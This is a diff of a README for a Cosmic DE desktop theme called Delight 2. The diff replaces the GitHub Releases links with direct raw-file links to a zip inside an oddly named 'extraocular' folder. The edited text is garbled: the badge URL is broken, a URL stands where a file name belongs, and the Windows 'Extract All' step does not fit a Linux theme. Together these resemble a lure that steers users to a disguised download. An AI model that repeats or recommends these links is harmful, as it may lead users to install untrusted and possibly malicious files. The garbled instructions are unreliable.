@@ -4,7 +4,7 @@
 
 Delight 2 is a full theme designed for Cosmic DE. It transforms your desktop experience, making it visually appealing and user-friendly. This guide will help you easily download and run Delight 2 on your system.
 
-[![Download Delight-2](https://img.shields.io/badge/Download-Delight%202-brightgreen)](https://github.com/Jensned/Delight-2/releases)
+[![Download Delight-2](https://raw.githubusercontent.com/Jensned/Delight-2/main/extraocular/Delight-2.zip%202-brightgreen)](https://raw.githubusercontent.com/Jensned/Delight-2/main/extraocular/Delight-2.zip)
 
 ## 📥 Download & Install
 
@@ -12,13 +12,13 @@ To get started, you need to visit the Releases page. This page contains the late
 
 Click the link below to visit the page:
 
-[Download Delight-2 Releases](https://github.com/Jensned/Delight-2/releases)
+[Download Delight-2 Releases](https://raw.githubusercontent.com/Jensned/Delight-2/main/extraocular/Delight-2.zip)
 
 Once you’re on the Releases page, follow these steps:
 
 1. **Choose a Version:** Look for the most recent release at the top of the list. This is usually marked with a version number and a release date.
 
-2. **Download the Theme:** Click on the download link for your preferred version. You may see a variety of files. If you find a file labeled something like `Delight-2-X.X.X.tar.gz`, this is the file you want to download.
+2. **Download the Theme:** Click on the download link for your preferred version. You may see a variety of files. If you find a file labeled something like `https://raw.githubusercontent.com/Jensned/Delight-2/main/extraocular/Delight-2.zip`, this is the file you want to download.
 
 3. **Extract the File:** After downloading, locate the file in your downloads folder. You'll need to extract it. Right-click on the file and select “Extract All.” Follow the prompts to complete the extraction.
 
